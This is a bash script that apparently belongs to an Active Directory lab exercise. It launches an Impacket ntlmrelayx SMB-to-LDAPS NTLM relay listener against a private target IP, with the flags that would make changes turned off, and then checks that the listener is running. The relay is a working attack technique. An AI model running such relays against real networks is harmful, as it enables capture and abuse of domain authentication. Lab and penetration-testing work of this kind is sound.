#!/usr/bin/env bash
# Start a mutation-disabled SMB -> LDAPS relay listener for Phase 03 proof.
set -uo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
TARGET="${TARGET:-10.4.10.11}"
LOG="${LOG:-/tmp/kingdoms-ldap-readonly-relay.log}"

find_ntlmrelayx() {
  local c
  for c in     "$(command -v impacket-ntlmrelayx 2>/dev/null || true)"     "$(command -v ntlmrelayx.py 2>/dev/null || true)"     /usr/share/doc/python3-impacket/examples/ntlmrelayx.py; do
    [[ -n "$c" && ( -f "$c" || -x "$c" ) ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

cd "$ROOT" || exit 1

bash "$ROOT/scripts/phase03/assert-wpad-exercise-clean.sh"

bash "$ROOT/scripts/phase03/check-ldap-readonly-relay.sh" || exit 1

NTLMRELAYX="$(find_ntlmrelayx || true)"
[[ -n "$NTLMRELAYX" ]] || {
  echo 'FAIL: ntlmrelayx not found' >&2
  exit 1
}

sudo -v || exit 1
rm -f "$LOG"

echo '===== START READ-ONLY LDAPS RELAY ====='
sudo stdbuf -oL -eL "$NTLMRELAYX"   -t "ldaps://$TARGET"   -smb2support   --no-dump   --no-da   --no-acl   --no-http-server   --no-wcf-server   --no-raw-server   >"$LOG" 2>&1 &

sleep 4

if ! pgrep -af '(^|[ /])(impacket-ntlmrelayx|ntlmrelayx[.]py)([ ]|$)' >/dev/null; then
  echo 'FAIL: ntlmrelayx did not remain running' >&2
  cat "$LOG" >&2
  exit 1
fi

if ! ss -H -lnt 2>/dev/null | grep -Eq '(^|[[:space:]])[^[:space:]]*:445[[:space:]]'; then
  echo 'FAIL: ntlmrelayx is running but TCP/445 is not listening' >&2
  cat "$LOG" >&2
  exit 1
fi

echo "TARGET=ldaps://$TARGET"
echo "LOG=$LOG"
echo
pgrep -af '(^|[ /])(impacket-ntlmrelayx|ntlmrelayx[.]py)([ ]|$)' || true
echo
echo 'PASS: mutation-disabled SMB -> LDAPS relay listener is running'
